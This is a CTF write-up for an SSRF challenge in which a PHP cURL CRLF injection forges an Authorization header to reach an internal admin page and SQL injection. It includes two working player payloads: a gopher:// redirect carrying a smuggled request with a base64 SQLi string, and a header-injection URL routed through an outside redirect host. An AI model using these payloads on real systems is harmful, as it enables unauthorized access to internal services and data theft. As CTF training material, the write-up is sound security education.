# curl_story_part_1 aka. cURL Lovers

## Overview
This challenge is published on ~ Jan.2014 . Long time ago, SSRF is not well-known like nowadays.

I've setup the challenge contains 2 parts:
1. frontend (index.php) recieves an URL from user.
2. backend (admin.php) can be accessed from `127.0.0.1` only.


## Bug
Was looking for a new idea for a challenge, I found out CLRF in PHP cURL (actually it caused by `libcurl`).

By overwriting HTTP headers, we can set `Authorization-Basic` with abitrary value. and `demo:demo` is skipped. SQLi behind, then extract the flag. 

Few years later, I found this: https://hackerone.com/reports/73242

It's coincident. The reporter filed a report on Dec.2013.

And I reliazed... I found out 0day and put it in the challenge...



## Solution

### raz0r.name
```
<?php

header('Location: gopher://localhost:80/1GET%20%2f%5f%4d%4c%2f%63%68%61%6c%6c%73%2f%63%75%72%6c%5f%73%74%6f%72%79%5f%70%61%72%74%5f%31%2f%61%64%6d%69%6e%2e%70%68%70%20HTTP%2f1.1%0d%0aAuthorization:%20Basic%20' .    urlencode(base64_encode("_ML' or 1=1 union select flag,2 from flag limit 1-- -:admin' or 1=1-- -")).'%0d%0aCookie:demo%3ddemo%0d%0aHost:localhost%0d%0a%0d%0a');
```

### Paul Axe
```
Vector:
http://ctf.wargame.vn/_ML/challs/curl_story_part_1/?url=pwny.tk/curl.php?x%0d%0aAuthorization:%20Basic+J3VuaW9uIHNlbGVjdCBmbGFnLDIgZnJvbSBmbGFnIC0tIDE6MQ==%0d%0a
(My server side code:
<?php

header("Location: http://localhost/_ML/challs/curl_story_part_1/admin.php");
?>
)
```
